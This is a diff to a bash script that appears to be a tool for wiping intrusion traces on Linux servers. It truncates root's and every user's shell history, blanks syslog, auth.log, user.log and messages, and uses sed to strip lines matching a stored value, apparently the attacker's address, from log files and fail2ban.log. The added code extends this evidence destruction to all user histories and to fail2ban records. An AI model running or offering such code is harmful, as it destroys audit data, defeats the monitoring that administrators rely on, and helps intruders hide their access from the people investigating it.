@@ -15,11 +15,19 @@ brutal_way() {
 echo "Cleaning all logs..."
 history -cw
 echo " " > /root/.*history
-echo " " > /home/*/.*history
 echo " " > /var/log/syslog
 echo " " > /var/log/auth.log
 echo " " > /var/log/user.log
 echo " " > /var/log/messages
+
+##Effacer tous les bash_history de tous les users à la sauvage
+users=$(ls /home/)
+tab=($users)
+for i in "${tab[@]}"
+do
+  echo " " > /home/${i}/.*history
+
+done
 
 if [ -f /var/log/fail2ban.log ]
 then
@@ -42,6 +50,12 @@ cat /tmp/log_files.txt | grep /var | while read line
 do
   sed -i "/${from}/d" $line > /dev/null 2>&1
 done
+
+if [ -f /var/log/fail2ban.log ]
+then
+  sed -i "/${from}/d" /var/log/fail2ban.log > /dev/null 2>&1
+fi
+
 
 read -p "Do you want to clear HTTP logs [Yes/no] ?" -n 1 -r
 echo ""
@@ -110,9 +124,11 @@ esac
 
 }
 
+:<<COM
 clear_ftp() {
 
 }
+COM
 
 if [ -z ${1} ]
 then
